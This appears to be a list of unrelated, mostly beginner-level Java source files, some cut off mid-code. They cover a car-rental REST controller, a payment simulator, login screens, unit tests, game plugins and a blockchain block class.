    "package com.codewithprojects.car_rent.controller;\nimport java.io.IOException;\nimport java.util.List;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.web.bind.annotation.DeleteMapping;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.ModelAttribute;\nimport org.springframework.web.bind.annotation.PathVariable;\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.PutMapping;\nimport org.springframework.web.bind.annotation.RequestBody;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.bind.annotation.RestController;\nimport org.springframework.web.multipart.MultipartFile;\nimport com.codewithprojects.car_rent.dto.BookACarDto;\nimport com.codewithprojects.car_rent.dto.CarDto;\nimport com.codewithprojects.car_rent.entity.Car;\nimport com.codewithprojects.car_rent.repository.CarRepository;\nimport com.codewithprojects.car_rent.services.auth.admin.AdminService;\n\n@RestController\n@RequestMapping(\"/api/admin\")\npublic class AdminController {\n\t\n\t@Autowired\n\tAdminService adminservice;\n\t@Autowired\n\tCarRepository carrepository;\n\t@PostMapping(\"/car\")\n\tpublic ResponseEntity<?> postCar(@RequestParam(\"imageFile\") MultipartFile imageFile, @ModelAttribute CarDto carDto) throws IOException{\n\t\ttry {\n\t        Boolean success = adminservice.postCar(carDto, imageFile);\n\t        if (success) {\n\t            return ResponseEntity.status(HttpStatus.CREATED).build();\n\t        } else {\n\t            return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(\"Failed to save car details\");\n\t        }\n\t    } catch (IOException e) {\n\t        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(\"Error processing the request\");\n\t    }\n\t}\n\t@GetMapping(\"/cars\")\n\tpublic ResponseEntity<?>getAllCars(){\n\t\treturn ResponseEntity.ok(adminservice.getAllCar());\n\t}\n\t@DeleteMapping(\"/car/{id}\")\n\tpublic ResponseEntity<Void>deleteCar(@PathVariable Long id){\n\t\tadminservice.deleteCar(id);\n\t\treturn ResponseEntity.ok(null);\n\t}\n\t@GetMapping(\"/car/{id}\")\n\tpublic ResponseEntity<CarDto> getCarById(@PathVariable Long id){\n\t\tCarDto carDto = adminservice.getCarById(id);\n\t\treturn ResponseEntity.ok(carDto);\n\t}\n\n\t@PutMapping(\"/car/{carId}\")\n\tpublic ResponseEntity<String> updateCar(@PathVariable Long carId, @RequestBody CarDto carDto) {\n\t    boolean updated = adminservice.updateCar(carId, carDto);\n\n\t    if (updated) {\n\t        return ResponseEntity.ok(\"Car updated successfully\");\n\t    } else {\n\t        return ResponseEntity.status(HttpStatus.NOT_FOUND).body(\"Car with ID \" + carId + \" not found\");\n\t    }\n\t} \n\t@GetMapping(\"/car/bookings\")\n\tpublic ResponseEntity<List<BookACarDto>>getBookings(){\n\t\treturn ResponseEntity.ok(adminservice.getBookings());\n\t}\n\t@GetMapping(\"/car/booking/{bookingId}/{status}\")\n\tpublic ResponseEntity<?> changeBookingStatus(@PathVariable Long bookingId, @PathVariable String status) {\n\t    boolean success = adminservice.changeBookingStatus(bookingId, status);\n\t    if (success) {\n\t        return ResponseEntity.ok().build();\n\t    } else {\n\t        return ResponseEntity.notFound().build();\n\t    }\n\t}\n//\t@PostMapping(\"/car/search\")\n//\tpublic ResponseEntity<?>searchCar(@RequestBody SearchCarDto searchCarDto){\n//\t\treturn ResponseEntity.ok(adminservice.searchCar(searchCarDto));\n//\t}\n\t @GetMapping(\"/search\")\n\t    public ResponseEntity<List<Car>> searchCars(@RequestParam(required = false) String brand,\n\t                                                @RequestParam(required = false) String type,\n\t                                                @RequestParam(required = false) String transmission,\n\t                                                @RequestParam(required = false) String color) {\n\t        List<Car> cars = adminservice.searchCars(brand, type, transmission, color);\n\t        return ResponseEntity.ok(cars);\n\t    }\n}",
    "import java.util.*;\n\nclass Currency {\n    String currencyCode;\n    String currencySymbol;\n    double rupeeEquivalent;\n\n    public Currency(String currencyCode, String currencySymbol, double rupeeEquivalent) {\n        this.currencyCode = currencyCode;\n        this.currencySymbol = currencySymbol;\n        this.rupeeEquivalent = rupeeEquivalent;\n    }\n}\n\nenum CardType {\n    DEBIT, CREDIT\n}\n\nclass Card {\n    String cardNumber;\n    String cardHolderName;\n    String expiryDate;\n    String cvv;\n    CardType cardType;\n\n    public Card(String cardNumber, String cardHolderName, String expiryDate, String cvv, CardType cardType) {\n        this.cardNumber = cardNumber;\n        this.cardHolderName = cardHolderName;\n        this.expiryDate = expiryDate;\n        this.cvv = cvv;\n        this.cardType = cardType;\n    }\n}\n\nclass Bank {\n    String bankName;\n    String ifscCode;\n    String branchName;\n\n    public Bank(String bankName, String ifscCode, String branchName) {\n        this.bankName = bankName;\n        this.ifscCode = ifscCode;\n        this.branchName = branchName;\n    }\n\n}\n\nclass User {\n    String id;\n    String name;\n    String email;\n    String password;\n    Bank bank;\n    String accountNumber;\n    double balance;\n    Currency currency;\n    Card card;\n\n    public User(String id, String password, String name, String email, Card card, Bank bank, String accountNumber,\n            double balance,\n            Currency currency) {\n        this.id = id;\n        this.password = password;\n        this.name = name;\n        this.email = email;\n        this.card = card;\n        this.bank = bank;\n        this.accountNumber = accountNumber;\n        this.balance = balance;\n        this.currency = currency;\n    }\n}\n\nclass Payment {\n    String paymentId;\n    double amount;\n    Currency currency;\n    Currency convertedCurrency;\n    User recepient;\n    User sender;\n\n    public Payment(String paymentId, User recepient, double amount, User sender) {\n        this.paymentId = paymentId;\n        this.amount = amount;\n        this.currency = sender.currency;\n        this.recepient = recepient;\n        this.sender = sender;\n        this.convertedCurrency = recepient.currency;\n    }\n\n    public void initiateTransaction(TransactionCallback callback) {\n        System.out.println(paymentId + \" initiated for \" + amount + \" \" + currency.currencyCode + \" from \"\n                + sender.name + \" to \" + recepient.name);\n        System.out.println(\"Proccess transaction (Y/N): \");\n        Scanner sc = new Scanner(System.in);\n        sc.useDelimiter(\"\\n\");\n        String choice = sc.next();\n        if (choice.equals(\"Y\") || choice.equals(\"y\")) {\n            System.out.println(\"Transaction successful\");\n            sender.balance -= amount;\n            recepient.balance += amount;\n            System.out.println(\"Amount debited from \" + sender.name + \" account number \" + sender.accountNumber\n                    + \" with \" + amount + \" \" + currency.currencyCode);\n            System.out.println(\"Amount credited to \" + recepient.name + \" account number \" + recepient.accountNumber\n                    + \" with \" + (amount * currency.rupeeEquivalent) + \" \" + convertedCurrency.currencyCode);\n            callback.onSuccess(this);\n        } else {\n            System.out.println(\"Transaction cancelled\");\n            callback.onFailure(new Exception(\"Transaction cancelled\"));\n        }\n    }\n}\n\n/**\n * TransactionCallback\n */\ninterface TransactionCallback {\n\n    void onSuccess(Payment token);\n\n    void onFailure(Exception exception);\n\n}\n\npublic class PaymentManagementSystem {\n\n    public static void clearConsole() {\n        try {\n            final String os = System.getProperty(\"os.name\");\n            if (os.contains(\"Windows\")) {\n                new ProcessBuilder(\"cmd\", \"/c\", \"cls\").inheritIO().start().waitFor();\n            } else {\n                Runtime.getRuntime().exec(\"clear\");\n            }\n        } catch (final Exception e) {\n            System.out.println(\"Error while clearing console: \" + e.getMessage());\n        }\n    }\n\n    public static void main(String[] args) {\n        Currency usd = new Currency(\"USD\", \"$\", 74.5);\n        Currency eur = new Currency(\"EUR\", \"\u20ac\", 88.5);\n        Currency gbp = new Currency(\"GBP\", \"\u00a3\", 102.5);\n        Currency jpy = new Currency(\"JPY\", \"\u00a5\", 0.67);\n        Currency inr = new Currency(\"INR\", \"\u20b9\", 1);\n\n        Bank bank1 = new Bank(\"citi Bank\", \"CITI001\", \"United States of America\");\n        Bank bank2 = new Bank(\"Women's Bank\", \"FEM002\", \"Vizag\");\n        Bank bank3 = new Bank(\"SBI Bank\", \"SBI003\", \"Hyderabad\");\n        Bank bank4 = new Bank(\"Fi Bank\", \"FED006\", \"Delhi\");\n        Bank bank5 = new Bank(\"ICICI Bank\", \"ICICI005\", \"Mumbai\");\n        Bank bank6 = new Bank(\"Union Bank Of India\", \"UBIN004\", \"Bangalore\");\n        Bank bank7 = new Bank(\"Axis Bank\", \"AXIS007\", \"Chennai\");\n        Bank bank8 = new Bank(\"Kotak Mahindra Bank\", \"KOTAK008\", \"Pune\");\n        Bank bank9 = new Bank(\"Karur Vysya Bank\", \"KVBC009\", \"Hyder",
    "package com.win.template_platform.index;\n\nimport java.io.PrintWriter;\n\nimport com.sap.cds.adapter.IndexContentProvider;\nimport com.sap.cds.adapter.IndexContentProviderFactory;\n\n/**\n * Explicitly adds links to UI resources provided by this application to the\n * index page\n */\npublic class UiIndexContentProviderFactory implements IndexContentProviderFactory {\n\n    @Override\n    public IndexContentProvider create() {\n        return new UiIndexContentProvider();\n    }\n\n    @Override\n    public boolean isEnabled() {\n        return true;\n    }\n\n    private static class UiIndexContentProvider implements IndexContentProvider {\n\n        private static final String ENDPOINT_START = \"\" +\n                \"                <ul>\\n\";\n\n        private static final String ENDPOINT = \"\" +\n                \"                    <li>\\n\" +\n                \"                        <a href=\\\"%s\\\">%s</a>\\n\" +\n                \"                    </li>\\n\";\n\n        private static final String ENDPOINT_END = \"\" +\n                \"                </ul>\\n\";\n\n        @Override\n        public String getSectionTitle() {\n            return \"UI endpoints\";\n        }\n\n        @Override\n        public void writeContent(PrintWriter writer, String contextPath) {\n            writer.print(ENDPOINT_START);\n            writer.printf(ENDPOINT, contextPath + \"fiori.html?sap-ui-xx-viewCache=false\",\n                    \"template -lunchpad\");\n            writer.printf(ENDPOINT, contextPath + \"/swagger/index.html\", \"Swagger UI\");\n            writer.print(ENDPOINT_END);\n            writer.print(ENDPOINT_END);\n        }\n    }\n}\n",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template\n */\npackage C.G.Usuario;\n\nimport M.P.DE.Source.Conexion;\nimport V.I.M.Gerente.MenuGerente;\nimport V.I.M.Ventas.MenuVentas;\nimport V.I.S.Login.FrmSession;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\nimport java.awt.event.WindowAdapter;\nimport java.awt.event.WindowEvent;\nimport java.sql.Connection;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport javax.swing.JFrame;\nimport javax.swing.JOptionPane;\n\n/**\n *\n * @author H\u00e9ctor\n */\npublic final class contSesion implements ActionListener {\n    private final FrmSession vista;\n\n    public contSesion(FrmSession vista) {\n        this.vista = vista;\n        configurarVentana();\n        configurarEventos();\n    }\n\n     private void configurarEventos() {\n        vista.btnIngresar.addActionListener(this);\n     \n    }\n    private void configurarVentana() {\n        vista.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);\n\n        vista.addWindowListener(new WindowAdapter() {\n            @Override\n            public void windowClosing(WindowEvent e) {\n                vista.setVisible(false);\n            }\n        });\n\n        vista.setSize(700, 550);\n        vista.setVisible(true);\n    }\n\n    @Override\n    public void actionPerformed(ActionEvent e) {\n        if (e.getSource() == vista.btnIngresar) {\n            // Llama al m\u00e9todo agregar cuando se hace clic en el bot\u00f3n\n            consultarUsuario();\n        }\n    }\n\n    public void consultarUsuario() {\n    String usuario = vista.txtUsuario.getText();\n    String clave = vista.tpsClave.getText();\n\n    Conexion db = new Conexion();\n    String usuarioCorrecto = null;\n    String claveCorrecto = null;\n    String cargoCorrecto = null;\n\n    try {\n        Connection cn = db.conectar();\n        PreparedStatement pst = cn.prepareStatement(\"SELECT\"\n                + \" usuario, \"\n                + \"clave, \"\n                + \"cargo \"\n                + \"FROM \"\n                + \"usuarios \"\n                + \"WHERE \"\n                + \"usuario = ?\");\n        pst.setString(1, usuario);\n\n        ResultSet rs = pst.executeQuery();\n\n        if (rs.next()) {\n            usuarioCorrecto = rs.getString(\"usuario\");\n            claveCorrecto = rs.getString(\"clave\");\n            cargoCorrecto = rs.getString(\"cargo\");\n        }\n\n        if (usuario.equals(usuarioCorrecto) && clave.equals(claveCorrecto)) {\n            mostrarMensajeBienvenida(usuario, cargoCorrecto);\n        } else {\n            mostrarMensajeError();\n        }\n\n    } catch (Exception e) {\n        JOptionPane.showMessageDialog(null, \"Error \" + e);\n    }\n}\n\n    private void mostrarMensajeBienvenida(String usuario, String cargo) {\n        String mensaje = \"Login correcto, Bienvenido \" + usuario;\n        JOptionPane.showMessageDialog(null, mensaje);\n\n        if (\"Gerente\".equals(cargo)) {\n            vista.dispose();\n            MenuGerente ofc = new MenuGerente();\n            ofc.setVisible(true);\n        } else if (\"Ventas\".equals(cargo)) {\n            vista.dispose();\n            MenuVentas ofc = new MenuVentas();\n            ofc.setVisible(true);\n        } else {\n            JOptionPane.showMessageDialog(null, \"Cargo desconocido para el usuario \" + usuario);\n        }\n    }\n\n    private void mostrarMensajeError() {\n        JOptionPane.showMessageDialog(null, \"Usuario o contrase\u00f1a incorrectos\");\n    }\n\n}\n",
    "import org.junit.Test;\nimport static org.junit.Assert.*;\nimport com.example.Calculadora;\n\n\npublic class TestCalculadora {\n\n     /**\n     * Cria uma nova Calculadora com valor inicial zero.\n     * \n     * @author [Lucas Jos\u00e9 Arantes Silva]\n     */\n    @Test\n    public void testConstrutorSemParametro() {\n        Calculadora calc = new Calculadora();\n        assertEquals(0, calc.getMemoria());\n    }\n\n /**\n     * Cria uma nova Calculadora com valor inicial zero.\n     * \n     * @author [Lucas Jos\u00e9 Arantes Silva]\n     */\n    @Test\n    public void testConstrutorComParametro() {\n        Calculadora calc = new Calculadora(3);\n        assertEquals(3, calc.getMemoria());\n    }\n\n /**\n     * Cria uma nova Calculadora com valor inicial zero.\n     * \n     * @author [Lucas Jos\u00e9 Arantes Silva]\n     */\n    @Test\n    public void testSomarNumeroNegativo() {\n        Calculadora calc = new Calculadora(3);\n        calc.somar(-2);\n        assertEquals(1, calc.getMemoria());\n    }\n\n /**\n     * Cria uma nova Calculadora com valor inicial zero.\n     * \n     * @author [Joao Vitor Quintanilha]\n     */\n    @Test\n    public void testSubtrairNumeroPositivo() {\n        Calculadora calc = new Calculadora(5);\n        calc.subtrair(2);\n        assertEquals(3, calc.getMemoria());\n    }\n\n/**\n     * Cria uma nova Calculadora com valor inicial zero.\n     * \n     * @author [Joao Vitor Quintanilha]\n     */\n    @Test\n    public void testMultiplicarNumeroPositivo() {\n        Calculadora calc = new Calculadora(4);\n        calc.multiplicar(2);\n        assertEquals(8, calc.getMemoria());\n    }\n\n /**\n     * Cria uma nova Calculadora com valor inicial zero.\n     * \n     * @author [Joao Vitor Quintanilha]\n     */\n    @Test(expected = Exception.class)\n    public void testDividirPorZero() throws Exception {\n        Calculadora calc = new Calculadora(6);\n        calc.dividir(0);\n    }\n\n    @Test\n    public void testDividirPorValorPositivo() throws Exception {\n        Calculadora calc = new Calculadora(8);\n        calc.dividir(2);\n        assertEquals(4, calc.getMemoria());\n    }\n\n /**\n     * Cria uma nova Calculadora com valor inicial zero.\n     * \n     * @author [Rafael Prado de Andrade]\n     */\n    @Test(expected = Exception.class)\n    public void testExponenciarValorMaiorQue10() throws Exception {\n        Calculadora calc = new Calculadora(2);\n        calc.exponenciar(11);\n    }\n\n /**\n     * Cria uma nova Calculadora com valor inicial zero.\n     * \n     * @author [Rafael Prado de Andrade]\n     */\n    @Test\n    public void testExponenciarPorUm() throws Exception {\n        Calculadora calc = new Calculadora(3);\n        calc.exponenciar(1);\n        assertEquals(3, calc.getMemoria());\n    }\n\n /**\n     * Cria uma nova Calculadora com valor inicial zero.\n     * \n     * @author [Rafael Prado de Andrade]\n     */\n    @Test\n    public void testExponenciarPorDez() throws Exception {\n        Calculadora calc = new Calculadora(2);\n        calc.exponenciar(10);\n        assertEquals(1024, calc.getMemoria());\n    }\n\n /**\n     * Cria uma nova Calculadora com valor inicial zero.\n     * \n     * @author [Rafael Prado de Andrade]\n     */\n    @Test\n    public void testZerarMemoria() {\n        Calculadora calc = new Calculadora(7);\n        calc.zerarMemoria();\n        assertEquals(0, calc.getMemoria());\n    }\n}",
    "package com.example.messymanagement;\n\nimport android.content.Intent;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.EditText;\n\nimport androidx.appcompat.app.AppCompatActivity;\n\npublic class loginn extends AppCompatActivity implements View.OnClickListener {\n    public Button act5;\n    EditText editText;\n    String myText;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_loginn);\n\n        editText = findViewById(R.id.email); //initialize the EditText here\n        myText = editText.getText().toString();\n\n        act5 = findViewById(R.id.loginbutton);\n\n        act5.setOnClickListener(this);\n    }\n\n    @Override\n    public void onClick(View v) {\n        Intent i;\n\n        if (v.getId() == R.id.loginbutton) {\n            EditText editText = findViewById(R.id.email);\n            String myText = editText.getText().toString();\n\n            if (myText.equals(\"E22CSEU0979\")) { //use equals() method for string comparison\n                i = new Intent(this, MainActivity.class);\n                startActivity(i);\n            } else if (myText.equals(\"E22CSEU1022\")) {\n                i = new Intent(this, MainActivity2.class);\n                startActivity(i);\n            }\n        }\n    }\n}\n\n\n",
    "package dev.derock.svcmusic;\n\nimport com.sedmelluq.discord.lavaplayer.player.AudioLoadResultHandler;\nimport com.sedmelluq.discord.lavaplayer.tools.FriendlyException;\nimport com.sedmelluq.discord.lavaplayer.track.AudioPlaylist;\nimport com.sedmelluq.discord.lavaplayer.track.AudioTrack;\nimport net.minecraft.server.command.ServerCommandSource;\nimport net.minecraft.text.Text;\nimport org.apache.http.HttpEntity;\n\nimport java.net.SocketImpl;\n\npublic class AudioTrackLoadHandler implements AudioLoadResultHandler {\n\n    private final ServerCommandSource source;\n    private final GroupManager group;\n\n    AudioTrackLoadHandler(ServerCommandSource source, GroupManager group) {\n        this.source = source;\n        this.group = group;\n    }\n\n    @Override\n    public void trackLoaded(AudioTrack track) {\n        SimpleVoiceChatMusic.LOGGER.info(\"Loaded track: \" + track.getInfo().uri);\n        group.enqueueSong(track);\n\n        if (source != null) {\n            source.sendFeedback(\n                () -> Text.literal(\"Enqueued \" + track.getInfo().title), false\n            );\n        }\n    }\n\n    @Override\n    public void playlistLoaded(AudioPlaylist playlist) {\n        playlist.getTracks().forEach(group::enqueueSong);\n\n        if (source != null) {\n            source.sendFeedback(\n                () -> Text.literal(\"Enqueued \" + playlist.getTracks().size() + \" songs from playlist.\"),\n                false\n            );\n        }\n    }\n\n    @Override\n    public void noMatches() {\n        SimpleVoiceChatMusic.LOGGER.debug(\"No matches found.\");\n\n        if (source != null) {\n            source.sendFeedback(\n                () -> Text.literal(\"No matches found!\"),\n                false\n            );\n        }\n    }\n\n    @Override\n    public void loadFailed(FriendlyException exception) {\n        if (!exception.severity.equals(FriendlyException.Severity.COMMON)) {\n            SimpleVoiceChatMusic.LOGGER.warn(\"Failed to load track from query\", exception);\n        }\n\n        if (source != null) {\n            source.sendFeedback(\n                () -> Text.literal(\n                    exception.severity == FriendlyException.Severity.COMMON\n                        ? \"Failed to load track: \" + exception.getMessage()\n                        : \"Track failed to load! Check server logs for more information\"\n                ), false\n            );\n        }\n    }\n}\n",
    "package com.edipo.first;\n\nimport static org.assertj.core.api.Assertions.assertThat;\n\nimport org.hamcrest.core.Is;\nimport org.junit.jupiter.api.Test;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;\nimport org.springframework.boot.test.context.SpringBootTest;\nimport org.springframework.boot.test.mock.mockito.MockBean;\nimport org.springframework.http.MediaType;\nimport org.springframework.test.web.servlet.MockMvc;\nimport org.springframework.test.web.servlet.request.MockMvcRequestBuilders;\nimport org.springframework.test.web.servlet.result.MockMvcResultMatchers;\n\nimport com.edipo.first.controller.UsuarioController;\nimport com.edipo.first.repository.UsuarioRepository;\n\n@SpringBootTest\n@AutoConfigureMockMvc\npublic class UsuarioControllerTest {\n\t\n\t@Autowired\n\tUsuarioController usuarioController;\n\t\n\t@Autowired\n    private MockMvc mockMvc;\n\t\n\t@MockBean\n    private UsuarioRepository usuarioRepository;\n\t\n\t@Test\n    public void whenUsuarioControllerInjected_thenNotNull() {\n        assertThat(usuarioController).isNotNull();\n    }\n\t\n\t@Test\n    public void whenPostRequestToUsuarioAndValidUsuario_thenCorrectResponse() throws Exception {\n        String user = \"{\\\"nome\\\": \\\"First\\\", \\\"email\\\" : \\\"first@domain.com\\\", \\\"senha\\\" : \\\"123456\\\", \\\"confirmacaoSenha\\\" : \\\"123456\\\"}\";\n        mockMvc.perform(MockMvcRequestBuilders.post(\"/usuario\")\n                .content(user)\n                .contentType(MediaType.APPLICATION_JSON))\n                .andExpect(MockMvcResultMatchers.status().isOk());\n    }\n\t\n\t@Test\n    public void whenPostRequestToUsuarioAndInValidUsuario_thenCorrectReponse() throws Exception {\n\t\tString user = \"{\\\"nome\\\": \\\"a\\\", \\\"email\\\" : \\\"first@domain.com\\\", \\\"senha\\\" : \\\"123456\\\", \\\"confirmacaoSenha\\\" : \\\"123456\\\"}\";\n        mockMvc.perform(MockMvcRequestBuilders.post(\"/usuario\")\n                .content(user)\n                .contentType(MediaType.APPLICATION_JSON))\n                .andExpect(MockMvcResultMatchers.status().isBadRequest())\n                .andExpect(MockMvcResultMatchers.jsonPath(\"$.nome\", Is.is(\"O nome deve ter entre 3 e 50 caracteres.\")))\n                .andExpect(MockMvcResultMatchers.content().contentType(MediaType.APPLICATION_JSON));\n    }\n\t\n\t@Test\n    public void whenPostRequestToUsuarioAndInValidUsuarioConfirmacaoSenha_thenCorrectReponse() throws Exception {\n\t\tString user = \"{\\\"nome\\\": \\\"First\\\", \\\"email\\\" : \\\"first@domain.com\\\", \\\"senha\\\" : \\\"123456\\\", \\\"confirmacaoSenha\\\" : \\\"123546\\\"}\";\n        mockMvc.perform(MockMvcRequestBuilders.post(\"/usuario\")\n                .content(user)\n                .contentType(MediaType.APPLICATION_JSON))\n                .andExpect(MockMvcResultMatchers.status().isBadRequest())\n                .andExpect(MockMvcResultMatchers.jsonPath(\"$.confirmacaoSenha\", Is.is(\"A confirma\u00e7\u00e3o da senha n\u00e3o corresponde \u00e0 senha fornecida.\")))\n                .andExpect(MockMvcResultMatchers.content().contentType(MediaType.APPLICATION_JSON));\n    }\n\n}\n",
    "package io.github.oomsooms.locationbookmark;\n\nimport org.bukkit.plugin.java.JavaPlugin;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.sql.SQLException;\n\npublic final class LocationBookmark extends JavaPlugin {\n    \n    private DatabaseManager dbManager;\n\n    @Override\n    public void onEnable() {\n        try {\n            // Create directory if it does not exist\n            Path path = Paths.get(this.getDataFolder().getParentFile().getPath(), \"LocationBookmark\");\n            String folderDir = path.toString();\n            if (!path.toFile().exists()) {\n                path.toFile().mkdirs();\n            }\n    \n            // Get the Singleton instance of DatabaseManager\n            dbManager = DatabaseManager.getInstance(folderDir, \"LocationBookmark.db\");\n\n            // Create table if it does not exist\n            String query = \"CREATE TABLE IF NOT EXISTS bookmarks (id INTEGER PRIMARY KEY, name TEXT, seed TEXT, dimension TEXT, userUuid VARCHAR(36), private BOOLEAN, x REAL, y REAL, z REAL)\";\n            dbManager.executeQuery(query);\n        } catch (Exception e) {\n            e.printStackTrace();\n        };\n\n        // Register command\n        this.getCommand(\"bookmark\").setExecutor(new BookmarkCommand(dbManager));\n\n        // Confirm plugin enabled\n        getLogger().info(\"LocationBookmark Plugin Enabled\");\n    }\n\n    @Override\n    public void onDisable() {\n        if (dbManager != null) {\n            try {\n                dbManager.closeConnection();\n            } catch (SQLException e) {\n                e.printStackTrace();\n            }\n        }\n        getLogger().info(\"LocationBookmark Plugin Disabled\");\n    }\n}\n",
    "\npackage Controleur;\n\nimport Modele.*;\nimport Vues.*;\nimport javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.*;\n\n/**\n * Ce contr\u00f4leur est un bouton pr\u00e9sent dans la fen\u00eatre initiale de\n * l'application, permettant de cr\u00e9er un tableau.\n * Ce bouton se manifeste sous la forme d'un gros bouton carr\u00e9, avec le texte\n * \"Cr\u00e9er un tableau\".\n * Elle va par la suite appeler la fen\u00eatre pop-up de cr\u00e9ation de tableau.\n * Consultez {@link VueCreationTableau} pour des informations sur la fen\u00eatre\n * appel\u00e9e.\n *\n * @see VueCreationTableau\n * @see FenetreUtilisateur\n * @author Olivier\n * @author Yannick\n */\npublic class ControleurBoutonCreerTableau extends JPanel implements ActionListener {\n\n\t// ***********************************\n\t// ******** ATTRIBUTS ****************\n\t// ***********************************\n\tprivate JButton ajouterTableau;\n\tprivate FenetreUtilisateur vue;\n\tprivate Utilisateur modele;\n\tprivate Tableau futurTableauCree;\n\tprivate TrelloLitePlus application;\n\n\tstatic public final String ACTION_CREER = \"CREER\";\n\n\t// ***********************************\n\t// ******* CONSTRUCTEUR **************\n\t// ***********************************\n\n\t/**\n\t * Constructeur de la classe ControleurBoutonCreerTableau\n\t * \n\t * @param modele      : un Utilisateur\n\t * @param vue         : le menu principal, o\u00f9 est pr\u00e9sent le bouton\n\t * @param application : l'application est le mod\u00e8le de l'application dans son\n\t *                    ensemble.\n\t *                    Cet \u00e9l\u00e9ment est notamment utile pour la sauvegarde.\n\t */\n\tpublic ControleurBoutonCreerTableau(Utilisateur modele, FenetreUtilisateur vue, TrelloLitePlus application) {\n\n\t\t// On initialise les attributs\n\t\tthis.vue = vue;\n\t\tthis.modele = modele;\n\t\tthis.application = application;\n\n\t\t// On cr\u00e9e le bouton\n\t\tajouterTableau = new JButton(\"Cr\u00e9er un tableau\");\n\t\tajouterTableau.setPreferredSize(new Dimension(250, 250));\n\t\tajouterTableau.setForeground(Color.WHITE);\n\t\tajouterTableau.setBackground(Color.BLACK);\n\n\t\t// On ajoute le bouton au contr\u00f4leur et on lui affecte un actionListener\n\t\tajouterTableau.addActionListener(this);\n\t\tajouterTableau.setActionCommand(ACTION_CREER);\n\t\tadd(ajouterTableau);\n\t\tvue.addElement(this);\n\t}\n\n\t/**\n\t * Lorsque l'on clique sur le bouton cr\u00e9er, on va ouvrir la fen\u00eatre de cr\u00e9ation\n\t * de tableau qui est l'objet suivant : {@link VueCreationTableau}\n\t */\n\tpublic void actionPerformed(ActionEvent e) {\n\t\tif (e.getActionCommand().equals(ACTION_CREER)) {\n\n\t\t\t// Le contr\u00f4leur poss\u00e8de un attribut Tableau qui repr\u00e9sente le futur tableau\n\t\t\t// cr\u00e9\u00e9. On va le transmettre \u00e0 la fen\u00eatre de cr\u00e9ation de tableau.\n\n\t\t\t// On va ouvrir la fenetre de cr\u00e9ation de tableau et cr\u00e9er le contr\u00f4leur associ\u00e9\n\t\t\t// \u00e0 cette fen\u00eatre\n\t\t\tVueCreationTableau vueCreationTableau = new VueCreationTableau();\n\t\t\tnew ControleurCreationTableau(futurTableauCree, vueCreationTableau, vue, modele, application);\n\n\t\t\t// On rend la fen\u00eatre visible\n\t\t\tvueCreationTableau.setVisible(true);\n\t\t}\n\t}\n\n}\n",
    "package equality;\n\nimport java.util.HashSet;\nimport java.util.List;\nimport java.util.Set;\n\npublic class Customer {\n  private String name;\n  private String address;\n  private long creditLimit;\n\n  public Customer(String name, String address, long creditLimit) {\n    this.name = name;\n    this.address = address;\n    this.creditLimit = creditLimit;\n  }\n\n  @Override\n  public boolean equals(Object other) {\n//    if (other instanceof Customer) {\n//      Customer otherC = (Customer)other;\n\n//    if (other instanceof Customer otherC) {\n//      return otherC.name.equals(this.name) && otherC.address.equals(this.address);\n//    }\n//    return false;\n\n    return other instanceof Customer otherC\n        && this.name.equals(otherC.name)\n        && this.address.equals(otherC.address);\n  }\n\n  @Override\n  public int hashCode() {\n    return name.length(); // functionally correct, but very inefficient!!\n  }\n}\n\nclass UseCustomer {\n  public static void main(String[] args) {\n    Customer c1 = new Customer(\"Fred\", \"Over there\", 1_000);\n    Customer c2 = new Customer(\"Jim\", \"Over here\", 2_000);\n    Customer c3 = new Customer(\"Fred\", \"Over there\", 4_000);\n\n    System.out.println(\"c1.equals(c2) ? \" + c1.equals(c2));\n    System.out.println(\"c1.equals(c3) ? \" + c1.equals(c3));\n\n    List<Customer> lc = List.of(c1, c2);\n    System.out.println(lc.contains(c3));\n\n    Set<Customer> sc = new HashSet<>();\n    sc.add(c1);\n    sc.add(c2);\n    System.out.println(sc.contains(c3));\n  }\n\n}\n",
    "package core;\n\nimport java.util.ArrayList;\n\nimport util.Util;\n\npublic class Block {\n\n\tprivate int blockID;\n\tprivate String previousBlockHash;\n\tprivate int nonce;\n\tprivate ArrayList<Transaction> transactionList;\n\t\n\tpublic Block(int blockID, String previousBlockHash, int nonce, ArrayList<Transaction> transactionList) {\n\t\tthis.blockID = blockID;\n\t\tthis.previousBlockHash = previousBlockHash;\n\t\tthis.nonce = nonce;\n\t\tthis.transactionList = transactionList;\n\t}\n\n\tpublic void addTransaction(Transaction transaction) {\n\t\ttransactionList.add(transaction);\n\t}\n\t\n\tpublic void getInformation() {\n\t\tSystem.out.println(\"------------------------------\");\n\t\tSystem.out.println(\"\ube14\ub85d \ubc88\ud638: \" + getBlockID());\n\t\tSystem.out.println(\"\uc774\uc804\ud574\uc2dc: \" + getPreviousBlockHash());\n\t\tSystem.out.println(\"\ucc44\uad74 \ubcc0\uc218 \uac12: \" + getNonce());\n\t\tSystem.out.println(\"\ud2b8\ub79c\uc7ad\uc158 \uac1c\uc218: \" + transactionList.size());\n\t\tfor(int i=0; i<transactionList.size(); i++) {\n\t\t\tSystem.out.println(transactionList.get(i).getInformation());\n\t\t}\n\t\tSystem.out.println(\"------------------------------\");\n\t}\n\t\n\tpublic String getBlockHash() {\n\t\tString transationInformations = \"\";\n\t\tfor(int i=0; i<transactionList.size(); i++) 